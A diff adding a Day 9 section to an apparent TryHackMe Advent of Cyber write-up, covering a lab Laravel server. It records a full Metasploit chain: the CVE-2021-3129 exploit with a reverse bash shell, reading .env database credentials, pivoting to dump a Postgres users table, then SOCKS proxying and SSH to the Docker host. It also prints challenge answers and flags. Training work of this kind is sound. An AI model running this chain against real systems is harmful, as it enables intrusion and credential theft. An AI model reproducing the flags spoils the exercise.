@@ -19,6 +19,10 @@ They have a cool story following the whole duration of the challenges, which exp
 - [Day 6 - It's beginning to look a lot like phishing (Email Analysis)](#day-6---its-beginning-to-look-a-lot-like-phishing-email-analysis)
 - [Day 7 - Maldocs roasting on an open fire (CyberChef)](#day-7---maldocs-roasting-on-an-open-fire-cyberchef)
 - [Day 8 - Last Christmas I gave you my ETH (Smart Contracts) (DRAFT)](#day-8---last-christmas-i-gave-you-my-eth-smart-contracts-draft)
+- [Day 9 - Dock the halls (Pivoting)](#day-9---dock-the-halls-pivoting)
+  - [Compromising a machine through metasploit](#compromising-a-machine-through-metasploit)
+  - [Pivoting to the DB](#pivoting-to-the-db)
+  - [Pivoting to the root machine](#pivoting-to-the-root-machine)
 - [Day 10 - You're a mean one, Mr.Yeti (Hack a game)](#day-10---youre-a-mean-one-mryeti-hack-a-game)
 - [Day 14 - I'm dreaming of secure web apps (Web Application)](#day-14---im-dreaming-of-secure-web-apps-web-application)
 - [Day 22 - Threats are failing all around me (Attack Surface Reduction)](#day-22---threats-are-failing-all-around-me-attack-surface-reduction)
@@ -394,6 +398,421 @@ Writeup for this challenge still incoming ....
 </div>
 
 **What flag is found after attacking the provided EtherStore Contract?** `flag{411_ur_37h_15_m1n3}`
+
+# Day 9 - Dock the halls (Pivoting)
+
+## Compromising a machine through metasploit
+
+> The IP address assigned  to me when starting the machine is `10.10.81.47`, substitute it for the one you receive.
+
+**Deploy the attached VM, and wait a few minutes. What ports are open?** To see the open ports, we can use `nmap`: 
+
+```
+└─$ nmap -sV 10.10.81.47                                                                        
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-11 13:12 CET
+Nmap scan report for 10.10.81.47
+Host is up (0.044s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.62 seconds
+```
+
+We can see that the only open port is `80`.
+
+**What framework is the web application developed with?** To gain a bit more information about the website, we can try to visualize it on our browser. For that, let's navigate to `http://10.10.81.47` (Since `80` is the default port for `http`, the browser already goes there without us indicating it). 
+
+On the bottom right of the website we can see `Laravel v8.26.1 (PHP v7.4.30)`. The answer to this question is then `Laravel`
+
+Since we now have more information on the website (we know it's using laravel), we can look for specific exploits for it. For that we will use the tool `Metasploit`.
+
+<div style="padding: 15px; border: 1px solid transparent; border-color: transparent; margin-bottom: 20px; border-radius: 4px; color: #a94442; background-color: #f2dede; border-color: #ebccd1;">
+Make sure your tool is updated. I had a hard time here since my metasploit was not up to date and so it was not showing me the CVE tryhackme was looking for. For that, you can do :
+
+apt update; apt install metasploit-framework
+</div>
+To enter metasploit we use the command `msfconsole`, and once we get the `msf6>` prompt, we can type `search laravel` to look for modules containing something related to laravel.
+
+```
+└─$ msfconsole
+...
+msf6 > search laravel
+
+Matching Modules
+================
+
+   #  Name                                              Disclosure Date  Rank       Check  Description
+   -  ----                                              ---------------  ----       -----  -----------
+   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
+   1  exploit/multi/php/ignition_laravel_debug_rce      2021-01-13       excellent  Yes    Unauthenticated remote code execution in Ignition
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/php/ignition_laravel_debug_rce
+```
+
+We see that we get two exploits as an answer. The first one (number 0) looks like it has something to do with serialization, we'll skip that for now. The second one (number 1) looks more interesting. As it says in the last line, we can now type `info 1` to get information on that module. 
+
+If we scroll to the bottom of the information, we can see a link on the *References* part, which has a link to a cve. That will be the answer to the next question: 
+
+**What CVE is the application vulnerable to?** 'CVE-2021-3129'
+
+Since we found an exploit which could work on that application, now it's trying to run it. For that, we first need to `use` the exploit and `set` the necessary parameters. To see the parameters we use `show info`:
+
+```
+msf6 > use 1
+[*] Using configured payload cmd/unix/reverse_bash
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > show options
+
+Module options (exploit/multi/php/ignition_laravel_debug_rce):
+
+   Name       Current Setting              Required  Description
+   ----       ---------------              --------  -----------
+   LOGFILE                                 no        Laravel log file absolute path
+   Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT      80                           yes       The target port (TCP)
+   SSL        false                        no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /_ignition/execute-solution  yes       Ignition execute solution path
+   VHOST                                   no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_bash):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+```
+
+We can see that the parameters or options which have `Required=yes` are:
+* **RHOSTS** : the remote host (the ip given to us for the challenge)
+* **RPORT** : the remote port. In this case it's pointing to the default one, which is already good for us
+* **LHOST** : our listener host we will use
+* **LPORT** : the listen port
+
+To make sure that the machine is vulnerable, we can set the `rhosts` option and ask metasploit to `check` for us if it's vulnerable: 
+
+```
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > set rhosts 10.10.81.47
+rhosts => 10.10.81.47
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > check
+[*] Checking component version to 10.10.81.47:80
+[*] 10.10.81.47:80 - The target appears to be vulnerable.
+```
+
+BINGO! So now we can set the other parameters and `run` the exploit. We set `lhost` to our IP (which we can find via the `ifconfig` command), and then we `run` it:
+
+```
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > set lhost tun0
+lhost => tun0
+
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > run
+[*] Started reverse TCP handler on tun0:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Checking component version to 10.10.81.47:80
+[+] The target appears to be vulnerable.
+[*] Command shell session 1 opened (tun0:4444 -> 10.10.81.47:50100) at 2022-12-12 23:16:59 +0100
+
+```
+And after that, we got our shell! If we want to do something else for now, but keep the session, we can type `background`, and then get it back with the `sessions` command:
+
+```
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions
+Active sessions
+===============
+
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  1         shell cmd/unix               tun0:4444 -> 10.10.81.47:50100 (10.10.81.47)
+```
+
+**What command can be used to upgrade the last opened session to a Meterpreter session?** We can search on the output of `sessions` for the one we need, but to open the last one, regardless of the index, we can do `sessions -u -1` (which is the answer to the question).
+
+## Pivoting to the DB
+
+Now we managed to compromise the first machine, and we have a basic raw shell and the meterepreter session that we just opened in that last question. That session is more stable and allows us to do more stuff. 
+
+Now we can use this meterpreter session with the command `sessions -i` and the index of the session, and start listing the files for something interesting:
+
+```
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > ls
+Listing: /var/www/html
+======================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100644/rw-r--r--  603   fil   2022-09-11 02:44:10 +0200  .htaccess
+100644/rw-r--r--  0     fil   2022-09-11 02:44:10 +0200  favicon.ico
+100644/rw-r--r--  1731  fil   2022-09-11 02:44:10 +0200  index.php
+100644/rw-r--r--  24    fil   2022-09-11 02:44:10 +0200  robots.txt
+100644/rw-r--r--  1194  fil   2022-09-11 02:44:10 +0200  web.config
+
+meterpreter > ls /
+Listing: /
+==========
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100755/rwxr-xr-x  0     fil   2022-09-13 21:39:42 +0200  .dockerenv
+040755/rwxr-xr-x  4096  dir   2022-09-13 11:48:51 +0200  bin
+040755/rwxr-xr-x  4096  dir   2022-09-03 14:10:00 +0200  boot
+040755/rwxr-xr-x  340   dir   2022-12-12 23:08:08 +0100  dev
+040755/rwxr-xr-x  4096  dir   2022-09-13 21:39:42 +0200  etc
+```
+
+We see here the answer to the next question. **What file indicates a session has been opened within a Docker container?** `/.dockerenv`
+
+**What file often contains useful credentials for web applications?**
+In Laravel, the application will likely contain a `.env` file that defines many common environment variables. In this case we can find it with the command `ls -la /var/www`. The answer to this question is then `.env`.
+
+We can then check out the contents of this file. We see many things, but for now, the following lines look really interesting:
+
+```
+meterpreter > cat /var/www/.env
+
+...
+DB_CONNECTION=pgsql
+DB_HOST=webservice_database
+DB_PORT=5432
+DB_DATABASE=postgres
+DB_USERNAME=postgres
+DB_PASSWORD=postgres
+...
+```
+
+We see that there is a postgres database somewhere, which we can potentially access since we have credentials. We don't know the IP address to access it, but metasploit can help us with that:
+
+```
+meterpreter > resolve webservice_database
+
+Host resolutions
+================
+
+    Hostname             IP Address
+    --------             ----------
+    webservice_database  172.28.101.51
+```
+
+Bingo! So now we know how to access it. Let's get some help from metasploit to see the structure of the DB and access it. For that, let's first `background` the meterpreter session we are on.
+
+To interact with the postgres DB, let's look for `search postgres` on metasploit to see if there is something it can help us with:
+
+```
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > search postgres
+
+Matching Modules
+================
+   #   Name                                              Description
+   -   ----                                              -----------
+...
+   16  auxiliary/scanner/postgres/postgres_schemadump    Postgres Schema Dump
+...
+```
+
+Number 16 looks interesting, let's use it with `use 16`. We look at the options with `show options`, and we only need to set the `RHOSTS` option. For that let's do `set rhosts 172.28.101.51` (the DB's IP).
+
+This is the first part, but metasploit will never be able to show us the DB's structure just like that, since it doesn't have visibility on the IP `172.28.101.51` (it's on an internal network). For that, we will have to indicate to metasploit that every time we talk to `172.28.101.51`, we want it to route it through the meterpreter session we created on the compromised host (since that host does have visibility on the DB). We will use the `route add` command indicating a specific IP and subnet `172.28.101.51/32` in this cases, and the session we want to use (it can be seen executing `sessions`, in this cases it's the `2`).
+
+```
+msf6 auxiliary(scanner/postgres/postgres_schemadump) > route add 172.28.101.51/32 2
+[*] Route added
+msf6 auxiliary(scanner/postgres/postgres_schemadump) > route
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.28.101.51      255.255.255.255    Session 2
+```
+
+Now we can finally run the auxiliary *auxiliary/scanner/postgres/postgres_schemadump*, and metasploit will be able to reach it.
+
+```
+msf6 auxiliary(scanner/postgres/postgres_schemadump) > run
+[*] 172.28.101.51:5432 - Found databases: postgres, template1, template0. Ignoring template1, template0.
+[+] Postgres SQL Server Schema 
+ Host: 172.28.101.51 
+ Port: 5432 
+ ====================
+---
+- DBName: postgres
+  Tables:
+  - TableName: users_id_seq
+    Columns:
+    - ColumnName: last_value
+      ColumnType: int8
+      ColumnLength: '8'
+    - ColumnName: log_cnt
+      ColumnType: int8
+      ColumnLength: '8'
+    - ColumnName: is_called
+      ColumnType: bool
+      ColumnLength: '1'
+  - TableName: users
+    Columns:
+    - ColumnName: id
+      ColumnType: int4
+      ColumnLength: '4'
+    - ColumnName: username
+      ColumnType: varchar
+      ColumnLength: "-1"
+    - ColumnName: password
+      ColumnType: varchar
+      ColumnLength: "-1"
+    - ColumnName: created_at
+      ColumnType: timestamp
+      ColumnLength: '8'
+    - ColumnName: deleted_at
+      ColumnType: timestamp
+      ColumnLength: '8'
+  - TableName: users_pkey
+    Columns:
+    - ColumnName: id
+      ColumnType: int4
+      ColumnLength: '4'
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+Amazing! Now we can see the schema dump of the DB. We see there are three tables (`users_id_seq`, `users` and `users_pkey`), and that probably the most interesting table for us is the `users` one, since it contains usernames and passwords. Let's try to access this data. For this, we will use the auxiliary in number 11 when we search for `search postgres`
+
+```
+msf6 exploit(multi/php/ignition_laravel_debug_rce) > search postgres
+
+Matching Modules
+================
+   #   Name                                              Description
+   -   ----                                              -----------
+...
+   11  auxiliary/admin/postgres/postgres_sql             PostgreSQL Server Generic Query
+...
+```
+
+We run `use 11` and check the options with `show options`. We can see that apart from setting the `RHOSTS` option, we will also need to set the `DATABASE` and `SQL` options to `postgres` and the query we want to execute, respectively.
+
+```
+msf6 auxiliary(admin/postgres/postgres_sql) > set rhosts 172.28.101.51
+rhosts => 172.28.101.51
+msf6 auxiliary(admin/postgres/postgres_sql) > set database postgres
+database => postgres
+msf6 auxiliary(admin/postgres/postgres_sql) > set sql "SELECT * from users;"
+msf6 auxiliary(admin/postgres/postgres_sql) > run
+[*] Running module against 172.28.101.51
+Query Text: 'SELECT * from users;'
+==================================
+    id  username  password  created_at                  deleted_at
+    --  --------  --------  ----------                  ----------
+    1   santa     p4$$w0rd  2022-09-13 19:39:51.669279  NIL
+```
+
+With this output, we can now answer the next two questions:
+
+**What database table contains useful credentials?**  `users`
+
+**What is Santa's password?** `p4$$w0rd`
+
+## Pivoting to the root machine
+
+Now we have credentials. What could we use them for? 
+
+We know we compromised a docker instance, which means there has to be a root machine which controls the docker instance. That is probably the final machine we need to pivot to. After looking into it for a while, I found out that the default IP address of the gateway between the Docker host and the bridge network is `172.17.0.1`. 
+
+We can add the route to this machine with the command `route add 172.17.0.1/32 -1`, in the same way we added the DB's IP previously. 
+
+Now, we will use metasploit as a proxy. For that, let's search for `search socks`
+
+```
+msf6 > search socks
+Matching Modules
+================
+   #  Name                                     Disclosure Date  Rank    Check  Description
+   -  ----                                     ---------------  ----    -----  -----------
+   0  auxiliary/server/socks_proxy                              normal  No     SOCKS Proxy Server
+   1  auxiliary/server/socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection
+   2  auxiliary/scanner/http/sockso_traversal  2012-03-14       normal  No     Sockso Music Host Server 1.5 Directory Traversal
+```
+
+We will use the first one in the list, so let's just type `use 0`, and `run` it.
+
+```
+msf6 > use 0
+msf6 auxiliary(server/socks_proxy) > run
+msf6 auxiliary(server/socks_proxy) > jobs
+Jobs
+====
+  Id  Name                           Payload  Payload opts
+  --  ----                           -------  ------------
+  0   Auxiliary: server/socks_proxy
+```
+
+We can see that after we run it, it will show on `jobs`. We need to take note of the port we get when we show the options for this auxiliary socks_proxy:
+
+```
+msf6 auxiliary(server/socks_proxy) > show info
+...
+Basic options:
+  Name      Current Setting  Required  Description
+  ----      ---------------  --------  -----------
+  SRVPORT   1080             yes       The port to listen on
+  ...
+```
+
+So it's `1080`. We can now go to another terminal, still inside Kali Linux but outside Metasploit, and use Metasploit as a proxy, thanks to that auxiliary job we are still running. We now need to add a new line to the configuration file of `proxychains` (`/etc/proxychains4.conf`). That will allow us to just use this command in front of every other command and use the defined proxy. We have to add the line `socks5 127.0.0.1 1080` (and remote or comment the other proxy there). The end of the file should look something like that:
+
+```
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+# socks4        127.0.0.1 9050
+socks5 127.0.0.1 1080
+```
+
+**What ports are open on the host machine?** Once we got all the proxy configured, we can start inspecting this final host we have to connect to. For that, we will use `nmap` together with the `proxychains` command we just configured: 
+
+```
+└─$ proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-19 17:28 CET
+Nmap scan report for 172.17.0.1
+Host is up (0.082s latency).
+
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+443/tcp  closed https
+5432/tcp closed postgresql
+```
+
+So the answer to this question is `22,80`.
+
+**What is the root flag?** After we discover that the *ssh* port is open, we can try to connect to it with the credentials we got earlier, and then inspect around:
+
+~~~
+└─$ proxychains -q ssh santa@172.17.0.1
+santa@172.17.0.1's password: p4$$w0rd
+
+root@hostname:~# ll
+total 28
+drwx------  4 root root 4096 Dec 19 16:30 ./
+drwxr-xr-x 22 root root 4096 Sep 13 16:48 ../
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Dec 19 16:30 .cache/
+drwx------  3 root root 4096 Dec 19 16:30 .gnupg/
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   38 Sep 13 17:06 root.txt
+root@hostname:~# cat root.txt 
+THM{47C61A0FA8738BA77308A8A600F88E4B}
+~~~
+
+So we see that the flag is written in `root.txt`, and it's `THM{47C61A0FA8738BA77308A8A600F88E4B}`.
 
 # Day 10 - You're a mean one, Mr.Yeti (Hack a game)
 
